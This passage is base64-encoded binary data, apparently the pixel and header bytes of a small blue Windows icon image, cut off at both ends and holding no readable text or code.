v/+/v7//f39//39/f/9/f3//f39//39/f/9/f3///79/////P/L3vr/M4L2/xpx8/8hdPH/IHPt/yBx6f8fbuP/Hmrc/x1m1P8cYcr/Flq+/zNouPBCcrjwFFa5/xtfxv8cZdH/Hmna/x9t4P8fcOf/IHLs/yFz7/8hdfL/IXb1/yF39v8WcPf/TpL5/87g+/////3////9/////f/+/f3//f39//39/f/9/f3//f39///+/f////3////9//f6/f+bwfv/I3n5/xx0+f8iePn/Inj5/yJ4+f8iePn/Inj5/x11+f8hePn/lr/7//r8/f////3////9//39/f/9/f3//f39//39/f/9/f3//f39//39/f///v3////9/////P+yz/r/Ln/3/xly9f8hdfP/IXTw/yBy7f8gcOj/H27i/x5q3P8dZtP/G2HJ/xZZvf8zZ7fwQ3K48BNVuP8bX8X/HGTP/x1o2P8ebN//H2/m/yBx6/8hc+7/IXXx/yF29P8hd/X/IXf2/xly9/8mevf/g7L6/8jd+//w9Pz////8/////P////z////8/////P///vz/5/D8/7PQ+/9Wl/r/GHL4/x52+P8iePj/Inj4/yJ4+P8iePj/Inj4/yJ4+P8iePj/H3b4/xhy+P9dnPr/vtf7/+/0/P////z////8///+/P///vz///78/////P////z/+/v8/8vf+v9tpfj/GnP2/xtz9f8hdvT/IXXy/yFz7/8gcuz/H3Dn/x9t4f8eadv/HGXS/xthyP8WWLz/Mme38ERyt/ATVbf/G17E/xxjzv8daNf/Hmve/x9v5P8gcOn/IHLt/yF08P8hdfL/IXb0/yF29f8hd/b/HnX2/xdx9v8gdvf/PIf3/3qt+P+hxfn/udP6/7DO+v+Wvvn/X534/y1/9/8bc/f/GHL3/yB39/8hd/f/IXf3/yF39/8hd/f/IXf3/yF39/8hd/f/IXf3/yF39/8gd/f/F3H3/x109/86h/f/jbj5/8ve+v/u8/r/8fT6/+/z+v/V5Pr/m8H5/1GT9/8hd/b/F3H2/x929f8hdvT/IXXz/yF08f8gc+7/IHHq/x9v5v8fbOD/HmnZ/xxl0f8bX8f/Fli7/zJntvBEcrfwE1S1/xpewv8cYsz/HWfV/x5q3P8fbuL/IHDn/yBx6/8hc+7/IXTx/yF18v8hdfP/IXb0/yF29f8hdvX/H3X1/xxz9f8Ub/X/F3D1/x519f8cc/X/FG/1/xdw9f8ddPX/IHb1/yF39f8hd/X/IXf1/yF39f8hd/X/IXf1/yF39f8hd/X/IXf1/yF39f8hd/X/IXf1/yF39f8fdvX/G3P1/xVw9f8jePX/L371/zaD9f8wf/X/Jnr1/xdw9f8YcfT/H3X1/yF29P8hdvT/IXXz/yF08f8hc+//IHLs/yBw6P8fbuT/Hmve/x1o1/8cZM//G1/F/xZYuf8zZ7XwR3S28BJTsv8aXMD/G2HJ/x1l0v8eadr/H2zf/x9u5P8gcOj/IHHr/yBz7f8hc+//IXTw/yF08f8hdfL/IXXy/yF18v8hdfL/IXXy/yB08v8fc/L/H3Ty/yF08v8hdfL/IXXy/yF18v8hdfL/IXXy/yF18v8hdfL/IXXy/yF18v8hdfL/IXXy/yF18v8hdfL/IXXy/yF18v8hdfL/IXXy/yF18v8gdPL/HnPy/x1y8v8ccvL/HXLy/x5z8v8gdPL/IXXy/yF18v8hdPH/IXXx/yF07/8hc+7/IHLs/yBw6f8fb+b/H23h/x5q2/8dZ9X/HGLM/xtewv8VVrb/NWe08E13tvARUK//Glu8/xtfxv8cZM//HWjW/x5r3P8fbeD/H27k/yBw6P8gcer/IHHr/x9y7P8ecez/HXHu/x1x7f8dcO3/HXDt/x1w7f8dcO3/HXDu/x1w7v8dcO7/HXDu/x1x7v8dce7/HXHu/x1x7v8dce7/HXHu/x1x7v8dce7/HXHu/x1x7v8dce7/HXHu/x1x7v8dce7/HXHu/x1x7v8dcO7/HXDu/x1w7v8dcO7/HXDu/x1w7f8dcO3/HXDt/x1w7f8dce3/HnHt/x9x7P8gcuz/IHHr/yBx6P8fb+X/H23h/x5r3f8daNj/HWXR/xthyP8aXL//FFSz/zhpsvFZfrf4D02r/xlZuP8aXsL/HGLK/x1m0v8eaNj/Hmrc/x9s3/8fbeL/HW7k/xxt5f8fcOf/KXbq/zR+7P88g+7/Qofu/0aK7/9JjPD/So3w/0yN8f9MjvH/TY7x/02O8f9Nj/H/TY/x/02P8f9Nj/H/TY7x/02O8f9NjvH/TY7x/02O8f9NjvH/TY7x/02O8f9Nj/H/TY/x/02P8f9Nj/H/TY7x/02O8f9MjvH/TI7x/0uN8P9JjPD/R4rv/0OI7/8+hO7/N3/t/yx56/8icej/HG3m/xxt5f8ebuL/H23g/x5r3f8eadn/HWfU/xxjzP8bX8T/Glu7/xNRr/89bLDtXoK2uA1Kpv8ZV7P/Glu8/xpfxf8bY8v/HWXR/x1n1/8daNn/Gmjc/yZy4P9Iier/ZZ3w/3Wo9P9+rvX/grH3/4Sy9/+Gs/f/h7T3/4e09/+HtPf/h7T3/4e09/+HtPf/h7T3/4e09/+HtPf/h7T3/4e09/+HtPf/h7T3/4e09/+HtPf/h7T3/4e09/+HtPf/h7T3/4e09/+HtPf/h7T3/4e09/+HtPf/h7T3/4e09/+HtPf/h7T3/4az9/+Fsvf/g7H3/3+u9v94qfX/a6Hx/1KQ7P8weOP/G2jc/xxo2v8eaNj/HWbT/xxjzv8bYMf/Gly//xhYtv8WUqv/IlinuyVaqXgWT6T/F1St/xhYtv8aXL7/G1/F/xxiy/8aYs7/HGXS/0KB4P9yo+//hrL0/4m09f+Hs/X/hrL1/4ay9f+FsvX/hbL1/4Wy9f+FsfX/hLH1/4Sx9f+EsfX/hLH1/4Sx9f+EsfX/hLH1/4Sx9f+EsfX/hLH1/4Sx9f+EsfX/hLH1/4Sx9f+EsfX/hLH1/4Sx9f+EsfX/hLH1/4Sx9f+EsfX/hLH1/4Sx9f+EsfX/hbH1/4Wy9f+FsvX/hbL1/4ay9f+GsvX/hrP1/4i09f+Hs/X/eqrx/1KN5f8jatX/GGLP/xtizP8bYMf/Gl3A/xlZuP8YVbD/FU+l/yBWprdSfLmIGVCh/xZQqP8YVbD/GVi3/xpcvv8ZXcP/I2fL/0yG3f9/rPD/ibPz/4Ww8/+FsfP/hbHz/4Wx8/+FsfT/hbH0/4Wx9P+FsvT/hbL0/4ay9P+GsvT/hrL0/4ay9P+GsvT/hrL0/4ay9P+GsvT/hrL0/4ay9P+GsvT/hrL0/4ay9P+GsvT/hrL0/4ay9P+GsvT/hrL0/4ay9P+GsvT/hrL0/4ay9P+GsvT/hrL0/4Wy9P+FsvT/hbH0/4Wx9P+FsfT/hbHz/4Wx8/+FsfP/hbHz/4ey8/+GsfL/XpTj/y1v0P8aXsT/Gly//xpauf8ZVrL/F1Kq/w9Jnv9Bba68d5bFSBtQnvoUTKD/F1Kp/xhVr/8XV7X/H169/1CF1/99quz/iLPx/4ay8f+GsvL/hrHy/4Ww8f+Dr/H/gq7x/4Gu8P+BrfD/gKzw/3+s8P9/rPD/f6vv/36r7/9+q+//fqvv/36r7/9+q+//fqvv/36r7/9/rO//f6zv/3+s7/9/rO//f6zv/3+s7/9/rO//fqvv/36r7/9+q+//fqvv/36r7/9+q+//f6vv/3+r7/9/rPD/gKzw/4Ct8P+BrvD/gq7w/4Ov8f+EsPH/hbHy/4ax8v+GsfH/h7Lx/4Sw7/9ilN//KGbC/xdXtv8YVbH/GFOq/xdPo/8MRZn/X4O5oZau0gM6ZqjoDESW/xZOof8XUaf/F1Os/xtYsv8rZr7/OHHG/z93zP9Bes7/QHnO/z13zv85dM3/NXHL/zJvyv8vbcn/LmzJ/yxryP8rasj/KmnI/yppx/8paMf/KWjH/ylox/8paMf/KWjH/ylox/8paMf/KWjH/ylox/8paMf/KWjH/ylox/8paMf/KWjH/ylox/8paMf/KWjH/ylox/8paMf/KWnH/ylpx/8qacf/KmrI/ytqyP8tbMn/L23J/zFuyv80ccv/OHPM/zx3zf8/eM7/QXnO/0B4zP86c8j/L2nB/x5btP8XU63/F1Go/xdPov8RR5n/H1Gc/LTC2VzQ2eUAg5/Jew5ElP8NQ5T/E0qd/xZOov8XUab/FFCo/xNQqv8TUK3/ElGu/xNSsP8TUrH/FFOy/xRTsv8VVLP/FVW0/xVVtP8VVbT/FVW0/xZVtP8WVbT/FlW0/xZVtP8WVbT/FlW0/xZVtP8WVbT/FlW0/xZVtP8WVbT/FlW0/xZWtP8WVrT/FlW0/xZVtP8WVbT/FlW0/xZVtP8WVbT/FlW0/xZVtP8WVbT/FlW0/xVVtP8VVbT/FVW0/xVVtP8VVbP/FFSz/xRTsv8TU7H/E1Kw/xJRr/8TUa3/E1Cr/xRQqf8WUKf/Fk+j/xVMnv8RR5f/D0ST/1t/uKbO1+QAxdHiAJ612ABlicF8NWKl4BxPm/8YTJv/FUud/wpEmv8MRp3/D0mg/xBLov8RTKP/Ek2k/xJNpf8STab/Ek6m/xJOpv8STqb/Ek6m/xJOpv8STqb/E06n/xNOp/8TTqf/E0+n/xNPp/8TT6f/E0+n/xNPp/8TT6f/E0+o/xNPqP8TT6f/E0+n/xNOp/8TTqf/E06n/xNOp/8TTqf/E06n/xNOp/8TTqf/E06n/xJOpv8STqb/Ek6m/xJOpv8STqb/Ek6m/xJNpv8STaX/Ek2k/xFMpP8QS6L/D0qg/w5Hnf8KRJv/Dkab/xhOnf8YTJn/IlOc7kp0tKWastcNpLrZAMXR4gCUrtQAl7DWAIOizwuGos5gR3W5gBxRoIZkh7rpWX+58ElztPBAbrLwPGux8DppsfA5aLDwN2ew8DdnsPA2Z7DwNmaw8DZmsPA2ZrDwNmaw8DVmsPA0ZrDwNGaw8DRmsPA0ZrDwNGaw8DRmsPA0ZrDwNGaw8DRmsPA0ZrDwNGaw8DRmsPA0ZrDwNGaw8DRmsPA0ZrDwNGaw8DRmsPA0ZrDwNGaw8DRmr/A2ZrDwNmaw8DZmsPA2ZrDwNmaw8DdnsPA3Z7DwOGix8DppsPA8a7HwP26y8EdztPBTe7fwbY2+8EVwr7gvYq+AXoa/YG2Qxg9tkMgAlK3TAKi82gDwAAAAAAAAB8AAAAAAAAADgAAAAAAAAAGAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAgAAAAAAAAACAAAAAAAAAAIAAAAAAAAABwAAAAAAAAAPwAAAAAAAADygAAAAwAAAAYAAAAAEAIAAAAAAAgCUAAAAAAAAAAAAAAAAAAAAAAACXp70AkaK8AGuJtFRGcbOPPW63uCdjvLgpZb7UOm/A8Ddvw/A2b8TwN3DF8DdvxfA3b8bwN3DG8DdwxvA3cMbwN3DG8DdwxvA3cMbwN3DG8DdwxvA3cMbwN3DG8DdwxvA3cMbwN3DG8DdwxvA3cMbwN3DG8DdwxvA3cMbwN3DG8DdwxvA3cMbwN3DG8DdwxvA3b8XwN3DF8DdvxPA3b8PwOW7A8DBpvuAoZL24PW64uEFvs5xsibNtnKi8B7S4vwCOob4AZIa1ihxXrv8WV7f/FVrA/xpfx/8aYcz/GGLQ/xhj0/8ZZNT/GWTV/xlk1v8ZZNb/GWXW/xll1v8ZZdb/GWXW/xll1v8ZZdb/GWXW/xll1v8ZZdb/GWXW/xll1v8ZZdb/GWXW/xll1v8ZZdb/GWXW/xll1v8ZZdb/GWXW/xll1v8ZZdb/GWXW/xll1v8ZZNb/GWTV/xlk1f8YY9P/GGLR/xlizf8ZX8n/FVrC/xVXuv8XVbD/W3+0v6mywAdxj7sqIFmu/BRVtv8aXsL/HGLL/x1m0/8daNj/Hmrb/x9r3f8ebN//Hmzf/x5t4P8ebeD/Hm3g/x5t4f8ebeH/Hm3h/x5t4f8ebeH/Hm3h/x5t4f8ebeH/Hm3h/x5t4f8ebeH/Hm3h/x5t4f8ebeH/Hm3h/x5t4f8ebeH/Hm3h/x5t4f8ebeH/Hm3g/x5t4P8ebeD/Hmzf/x5s3/8fa97/Hmrb/x5p2P8dZtT/HGPM/xtfxP8WWLn/F1Ot/2+NuV5oibp0F1Wx/xlbvv8cYsr/HWbT/x5q2/8fbd//H27j/x9v5f8gcOf/IHDn/yBx6P8gcej/IHHp/yBx6f8gcen/IHHp/yBx6f8gcen/IHHp/yBx6f8gcen/IHHp/yBx6f8gcen/IHHp/yBx6f8gcen/IHHp/yBx6f8gcen/IHHp/yBx6f8gcen/IHHp/yBx6P8gcej/IHHo/yBw5/8fcOb/H27k/x9t4P8eatz/HWfV/xxjzP8bXcH/EVKy/0t2taE4abOCGFe2/xtfxP8cZND/Hmna/x9t4f8gcOb/IHHq/yBy7f8hc+7/IXPu/yFz7/8hc/D/IXPw/yFz8P8hc/D/IXPw/yFz8P8hc/D/IXPw/yFz8P8hc/D/IXPw/yFz8P8hc/D/IXPw/yFz8P8hc/D/IXPw/yFz8P8hc/D/IXPw/yFz8P8hc/D/IXPw/yFz8P8hc+//IXPv/yFz7v8gcu3/IHLr/yBw5/8fbuL/Hmrc/x1l0/8bYcf/FVe4/zFls7ldgrnREFO4/xxhyf8dZ9X/Hmze/x9w5f8gcuv/IXPu/yF18f8hdfL/IXbz/yF28/8hdvT/IXb0/yF29P8hdvT/IXb0/yF29P8hdvT/IXb0/yF29P8hdvT/IXb0/yF29P8hdvT/IXb0/yF29P8hdvT/IXb0/yF29P8hdvT/IXb0/yF29P8hdvT/IXb0/yF29P8hdvP/IXbz/yF18/8hdfL/IXPv/yBy7P8gcOb/H23g/x1o1/8cYsv/F1m8/zBls8hVfrr1EVW8/xxjzP8daNj/H23h/yBx6P8hc+7/IXTy/yF29P8hdvb/IXf2/yF39v8hd/b/IXf2/yF39v8hd/f/IXf3/yF39/8hd/f/IXf3/yF39/8hd/f/IXf3/yF39/8hd/f/IXf3/yF39/8hd/f/IXf3/yF39/8hd/f/IXf3/yF39/8hd/f/IXf2/yF39v8hd/b/IXf2/yF29v8hdvT/IXXz/yFz7/8gcer/H27i/x5q2v8cZM//FVm//z5vt/BLd7rwFFe+/xxjzv8eadr/H27i/yBy6/8hdO//IXbz/yF39v8hd/f/Inj4/yF3+P8edvj/GHL4/xRw+P8Sb/j/E2/4/xdx+P8ddfj/IXf5/yJ4+f8iePn/Inj5/yJ4+f8iePn/Inj5/yJ4+f8iePn/Inj5/yF4+P8edvj/GXP4/xZx+P8VcPj/FnH4/xpz+P8edfj/IXf4/yF39/8hd/b/IXb1/yF18f8gcuz/H2/k/x5q3P8cZdH/FlrC/zdquPBGdLrwFFi+/xxjz/8eatv/H2/k/yBy6/8hdfH/IXb1/yF39/8iePj/Hnb5/xt0+f8wgPr/Xpz7/4Cx+/+Qu/v/ibf8/22m+/87iPr/G3X6/x12+f8iefr/Inn6/yJ5+v8iefr/Inn6/yJ5+v8iefr/IHf6/xlz+f8uf/r/V5n7/3Op+/96rfv/caj7/0+U+v8sfvn/GnP5/x92+P8hd/f/IXf1/yF18v8gc+3/H2/m/x5r3f8dZdL/F1zD/zRpufBEc7rwFFi//xxk0P8eatv/H2/k/yBy7P8hdfH/IXf1/yF39/8Zc/j/KHz6/6HF/P/o8f3////+/////v////7////+/////v/w9v7/qcv9/yt/+/8Zc/r/Inn6/yJ5+v8iefr/Inn6/yJ5+v8cdfr/Hnb6/4i3/P/i7f7//f7+/////v////7////+//v8/v/l7/3/kLv7/yB3+P8ac/f/IXf2/yF18v8gc+7/IHDm/x5r3v8dZdL/F1zD/zNpufBEc7rwFVnA/xxk0P8eatz/H2/l/yBy7f8hdfL/IXf1/xhy9/89ifn/xtz9/////v////7////+///+/v/+/v7//v7+/////v////7////+/83g/f9Djfv/GHP6/yJ5+v8iefr/Inn6/xp1+v8wgvv/stH9/////v////7////+/////v////7////+/////v////7////+/7vV/P82hPj/GHH2/yF28/8hcu7/IHDm/x5r3v8dZtP/F1zE/zJpuvBDc7rwFVnA/xxk0P8eatz/H2/l/yBy7f8hdfL/GXL1/z+J+f/f6/3////+//7+/v/+/v7//v7+//7+/v/+/v7//v7+//7+/v/+/v7//v7+/////v/m8P7/SI/7/xl0+v8jefr/HHb6/zOD+//Q4v3////+/////v/+/v7//v7+//7+/v/+/v7//v7+//7+/v/+/v7////+/////f/X5vz/OYX3/xpy8/8hc+7/IHDn/x5s3v8dZtP/F1zE/zJpuvBCc7rwFVnA/xxk0P8eatz/H2/l/yBy7f8ec/L/JXn2/8zf+/////3//v7+//7+/v/+/v7//v7+//7+/v/+/v7//v7+//7+/v/+/v7//v7+//7+/v////7/2Of+/y6A+/8bdfr/IHj6/77X/f////7//v7+//7+/v/+/v7//v7+//7+/v/+/v7//v7+//7+/v/+/v7//v7+//39/f////z/xtv6/yR48/8ecu7/IHDn/x5s3v8dZtP/F1zE/zJouvBCc7rwFVnB/xxl0P8eatz/H2/l/yBy7f8WbvL/gLD3/////P/+/v3//v7+//7+/v/+/v7///7+/////v////7////+/////v/+/v7//v7+//7+/v////7//////5O9/v8La/r/dKv8//////////7//v7+//7+/v/+/v7////+/////v////7////+//7+/v/+/v7//v7+//39/f/9/fz////7/36u9f8Wbe7/IHDn/x5s3v8dZtP/F13E/zJouvBBcrrwFVrB/x1l0P8eatz/H2/l/x5x7f8ld/L/1OT5/////P/9/f3//v7+//7+/v////7////+/9Hj/f+fxPz/u9X9//39/v////7//v7+/////////////////+fw//82hvz/zeH//////////////v7+//7+/v////7////+/9no/f++2P3/5u/+/////v/+/v7//v7+//39/f/8/P3////7/9bj9/8md+7/HW/n/x5s3v8dZtP/F13E/zFouvBBcrrwFVrB/x1l0P8eatz/H2/l/xlu7f9JjfP/9/j6//7+/P/9/f3//v7+/////v////7/p8r9/yN5+/8Vcvr/GXT6/26n/P/3+v7///////////////////////////+uzv7/7/X//////////////////////v/+//7/kbz8/yV7+/8ddvr/MIH7/7XS/f////7////+//39/f/9/f3//vz7//f49/9Pj+//GGzn/x5s3v8dZtP/F13E/zFouvBBcrrwFVrB/x1l0P8eatz/H2/l/xVt7P9nn/T//vz6//38/P/9/f3//v7+/////v/p8f7/MIL6/xl0+v8iefr/IHf6/xRx+v+uzv7////////////////////////////4+////P3////////////////////////C2v7/HHX6/xx2+v8gePr/GXP6/y6A+v/Z5/3////+//7+/v/9/f3/+/v7//789/9ypO//FGnn/x5s3v8dZtP/F13E/zFouvBBcrrwFVrB/x1l0f8ea9z/H2/l/xRr7P9zp/T///76//39/P/9/f3//v7+/////v/D2v3/IHj6/yB4+v8iefr/Inn6/xJv+v+Htv3///////////////////////////////////////////////////////////+RvP3/EnD6/yJ5+v8iefr/Inn6/xFv+v+QvPz////+//7+/v/8/Pz/+/v7///+9/9/rfD/Emjn/x5s3v8dZtP/F13E/zFouvBBcrrwFVrB/x1k0f8ea9z/H2/m/xVs7f9to/T///76//79/P/9/f3//v7+/////v/R4v3/JXv6/yB4+v8iefr/Inn7/xdz+/9rpv3///////////////////////////////////////////////////////////+QvP3/EnD7/yJ5+v8iefr/Inn6/xNw+v+Pu/z////+//7+/v/8/Pz/+/v7///99/94qPD/E2nn/x5s3v8dZtP/F13E/zFouvBBcrrwFVrB/x1k0f8ea9z/H2/m/xZs7f9jnfT//fz6//79/P/+/v7//v7+/////v/r8/7/LoD6/x93+v8iefv/Inn7/x53+/80g/z/6/P///////////////////////////////////////////////////////+Vvv3/EXD7/yJ5+/8iefr/Inn6/xNw+v+QvPz////+//7+/v/8/Pz//fv7//v69/9hmvD/Fmrn/x5s3/8dZtP/F13E/zFouvBBcrrwFVrB/x1k0f8ea9z/H2/l/xlu7f9IjPP/9vj6///+/P/+/v7//v7+/////v/8/f7/VJf7/xhz+v8iefv/Inn7/yJ5+/8bdfv/VZj8/7fT/v/N4f7/zuH+/83h/v/N4f7/zeH+/83h/v/N4f7/zeH+/87h/v94rf3/FnL7/yJ5+/8iefr/Inn6/xJv+v+Nuvz////+//7+/v/8/Pz///37/+vx9/84ge//G23n/x5s3/8dZtT/F13E/zFouvBBcrrwFVrB/x1k0f8ea9z/H2/l/x1x7f8qevP/3+r6/////P/+/v7//v7+///+/v////7/pcj9/xZy+v8iefv/Inn7/yJ5+/8iefv/GnT7/x53+/8le/v/JXv7/yV7+/8le/v/JXv7/yV7+/8le/v/JXv7/yV7+/8jevv/Inn7/yJ5+/8iefv/IXj6/xRx+v+nyv3////+//7+/v/9/Pz////7/6rI9/8Zbu7/H3Dn/x5s3/8cZtT/F13F/zFouvBBcrrwFVrB/x1k0f8ea9z/H2/l/yBy7f8ZcPL/qMn5/////P/+/v7//v7+//7+/v////7/9vr+/0+U+/8Xcvv/Inn7/yJ5+/8iefv/Inn7/yB4+/8gePv/IHj7/yB4+/8gePv/IHj7/yB4+/8gePv/IHj7/yB4+/8hePv/Inn7/yJ5+/8hefv/FHH6/16e/P/2+v7////+//7+/v////3/8PT6/0WL9P8Zb+//IHDn/x5s3/8cZtT/F13F/zFouvBBcrrwFVrB/x1k0f8ea9z/H2/l/yBy7f8Xb/L/Wpn3//n7/P////7//v7+//7+/v/+/v7////+/9Tl/v8wgfz/GHT7/yJ5+/8iefv/Inn7/yJ5+/8iefv/Inn7/yJ5+/8iefv/Inn7/yJ5+/8iefv/Inn7/yJ5+/8iefv/Inn7/yF4+/8hefv/jbr8//L3/v////7//v7+//7+/v////3/7/T6/z+H9P8ab+//IHDn/x5s3/8cZtT/F13F/zFouvBBcrrwFVrB/x1k0f8ea9z/H2/l/yBy7f8ec/P/Jnn2/9/q/P////7//v7+//7+/v/+/v7//v7+/////v/K3///Ooj8/xNw+/8ed/v/IXj7/yJ5+/8iefv/Inn7/yJ5+/8iefv/Inn7/yJ5+/8iefv/Inn7/yJ5+/8iefv/Inn7/yJ5+/8bdfr/h7f9/////v/+/v7//v7+//7+/v/9/Pz////7/4239v8Vbe7/IHDn/x5s3/8dZtT/F13F/zFouvBBcrrwFVrB/x1k0f8ea9z/H2/l/yBy7f8Xb/L/a6T3//r8/P/+/v7//v7+//7+/v/+/v7////+/////v//////7/X//4O0/f8zg/z/GXT7/xNw+/8Vcfv/FXH7/xVx+/8Vcfv/FXH7/xVx+/8Vcfv/GHP7/x93+/8iefv/Inn7/yJ5+/8gePr/Hnf6/8Tb/v////7//v7+//7+/v/8/Pz////7/83d9/8jde//Hm/n/x5s3/8dZtT/F13E/zFouvBBcrrwFVrB/x1k0f8ea9z/H2/m/x5y7f8hdfL/ydz5/////P/9/f3//v7+//7+/v////7////+/9jn/f+00v3/utX9/7fT/v+51P7/qsz+/4m3/f94rf3/eK39/3it/f94rf3/eK39/3mt/f95rv3/Y6H9/yd8/P8ed/v/Inn7/yJ5+v8iefr/FXH6/2ql/P////7////+//7+/v/8/Pz//v37//Dz9/88hO//Gm3n/x5s3/8dZtP/F13E/zFouvBBcrrwFVrB/x1l0f8ea9z/H2/l/xpv7f9DifP/9Pb6///+/P/9/f3//v7+/////v////7/mMD9/yN6+v8cdvr/HXb6/xBu+v+It/3//////////////////////////////////////////////////////8La/v8qfvv/H3f7/yJ5+v8iefr/Hnf6/zGC+v/n8P7////+//7+/v/8/Pz//Pv7//r59/9fme//Fmrn/x5s3v8dZtP/F13E/zFouvBAcbrwFVrB/x1l0P8eatz/H2/l/xZs7P9knfT//fz6//39/P/9/f3//v7+/////v/r8/7/LoD6/xp0+v8hePr/IXj6/xJv+v+EtP3///////////////////////////////////////////////////////////9wqPz/F3L6/yJ5+v8iefr/Inn6/xlz+v+nyv3////+//7+/v/9/f3/+/v7///89/90pe//E2nn/x5s3v8dZtP/F13E/zFouvBBcrrwFVrB/x1l0P8eatz/H2/l/xRr7P9wpPT///36//38/P/9/f3//v7+/////v/J3v3/Inn6/yB4+v8iefr/Inn6/xNw+v+CtPz///////////////////////////////////////////////////////////+Nuvz/E2/6/yJ5+v8iefr/Inn6/xFv+v+Lufz////+//39/f/9/f3/+/v7///+9/9+rPD/Emjn/x5s3v8dZtP/F13E/zFouvBBcrrwFVrB/x1l0P8eatz/H2/l/xVr7P9so/T///36//38/P/9/f3//v7+/////v/W5v3/I3n6/x53+v8iefr/Inn6/xJv+v+bw/3////+/////////////////////////////v///////////////////////v+awvz/EnD6/yJ5+v8iefr/IXj6/xZy+v+qzP3////+//39/f/9/f3/+/v7///+9/99q/D/Emjn/x5s3v8dZtP/F13E/zFouvBBcrrwFVrB/x1l0P8eatz/H2/l/xht7f9UlPP/+vr6//79/P/9/f3//v7+/////v/+/v7/eq78/xJv+v8Vcfr/EW/6/0aO+//o8f7////+//7+/v/////////////////W5v//9fn////////+/v7//v7+/////v/f7P3/NYX7/xNw+v8bdfr/D276/12c/P/4+/7////+//39/f/8/Pz//Pv6//379/9pn+//FWrn/x5s3v8dZtP/F13E/zFouvBBcrrwFVrB/xxl0P8eatz/H2/l/xxw7f8vffL/5e35/////P/9/f3//v7+//7+/v////7/+vz+/6LG/f9rpvz/h7b8/+Tu/v////7//v7+//7+/v/+/v7////+//P3/v9enfv/6PH+/////v/+/v7//v7+//7+/v////7/0OP9/2Wi/P9Gj/v/d6z8/+jx/v////7//v7+//39/f/8/Pz//v36//Dz9/8+he7/Gm3n/x5s3v8dZtP/F13E/zFouvBBcrrwFVnA/xxk0P8eatz/H2/l/yBy7f8Yb/L/nsL4/////P/+/f3//v7+//7+/v/+/v7////+/////v////7////+/////v/+/v7//v7+//7+/v/+/v7////+/67O/f8Rb/r/sc/9/////v/+/v7//v7+//7+/v/+/v7////+/////v/4+/7////+/////v/+/v7//v7+//39/f/8/Pz////6/7rS9v8cce7/HnDn/x5s3v8dZtP/F13E/zFouvBCcrrwFVnA/xxk0P8eatz/H2/l/yBy7f8bcfL/PIb2/+vx/P////3//f3+//7+/v/+/v7//v7+//7+/v////7///7+//7+/v/+/v7//v7+//7+/v////7/8/j+/0eP+/8Rb/r/TpP7//j7/v////7//v7+//7+/v/+/v7//v7+/////v////7////+//7+/v/+/v7//v7+//39/f///vz/+Pn6/1SU9P8Ybe7/IHDn/x5r3v8dZtP/F1zE/zJouvBCcrrwFVnA/xxk0P8eatv/H2/k/yBy7P8hdfL/FnD1/2eh+f/7/P3////9//39/v/+/v7//v7+//7+/v/+/v7//v7+//7+/v/+/v7//v7+/////v////7/dKv8/xdz+v8iefr/F3L6/4e2/P////7////+//7+/v/+/v7//v7+//7+/v/+/v7//v7+//7+/v/+/v7//f39/////f////z/ibb4/xdv8v8gc+7/IHDm/x5r3v8dZtP/F1zD/zJouvBCcrrwFVi//xxjz/8eatv/H2/k/yBy6/8hdfD/IHb1/xdx9v9upvr/8Pb9/////f////3//f39//39/f/+/v7//v7+//39/v////7////+//T4/v93rPz/GXP6/yF5+v8iefr/IHj6/xt1+v+Svfz////+/////v/+/v7//v7+//7+/v/9/f3//f39//39/f/9/f3////9/////f+Ru/n/G3P1/x908v8gc+3/H2/m/x5r3f8dZdL/F1zD/zJoufBCcrnwFFi+/xxjzv8eadr/H27j/yBx6/8hdPD/IXbz/yB29v8Wcff/SY/4/7fS+//4+vz////9/////f////3////9/////f////3/vNb8/06T+v8Xcfn/IXf5/yJ4+f8iePn/Inj5/x93+f8ac/n/aqT6/9zp/P////3////9/////P///v3////9/////f////3/3On7/2uk+f8Zcvb/HnT0/yF18f8gcuz/H2/k/x5q3P8dZNH/F1vC/zJouPBDcrjwE1e8/xxjzP8daNn/H23h/yBx6f8hc+7/IXTy/yF29f8hd/b/GXL2/xtz9v9MkPj/ocX6/8Xa+v/U4/r/y976/7DO+v9lofj/HHT3/xhy9/8hePj/Inj4/yJ4+P8iePj/Inj4/yJ4+P8gd/f/FXD3/zGB+P+Wvvr/0+P6/+zy+//x9fv/6vD7/8nd+v+Wvvn/MoH3/xVw9f8gdfT/IXXz/yF07/8gcer/H27j/x5q2/8cY8//F1rA/zJot/BEc7fwE1a6/xxhyv8dZ9b/Hmzf/yBw5v8gcuz/IXTw/yF18v8hdvP/IXb0/yB19f8ZcvX/F3D1/yJ39f8mevX/JHj1/xtz9f8XcPX/H3b1/yF39f8hdvX/IXb1/yF29f8hdvX/IXb1/yF29f8hd/X/IXf1/xxz9f8YcfX/Jnn1/y5/9f81gvX/LX71/yJ39f8XcPT/HHP0/yF29P8hdfL/IXTw/yBy7f8fcej/H23h/x1o2P8cY83/Flq+/zNotvBJdbfwE1S2/xtgxv8dZdL/Hmrb/x9u4v8gcej/IHLr/yBy7v8fc+//HnLw/x5z8P8dcvD/HHHw/xtw8P8acPD/GnDw/xtx8P8ccvD/HXLw/xxy8P8ccvD/HHLw/xxy8P8ccvD/HHLw/xxy8P8ccvD/HHLw/x1y8P8ccfD/GnDw/xlv8P8Yb/D/GXDw/xtx8P8dcvD/H3Pw/x9z7/8gc+//IHLs/yBx6f8fbuT/Hmvd/x1m1P8cYcn/FVe6/zZptPFYf7j4EFCw/xtewf8cY83/HWfW/x5r3f8fbuL/HW3l/xtt5/8gcen/Knjs/zF87v82gO7/OYLu/zuD7/88hO//PITv/z2E7/89he//PYXv/z2F7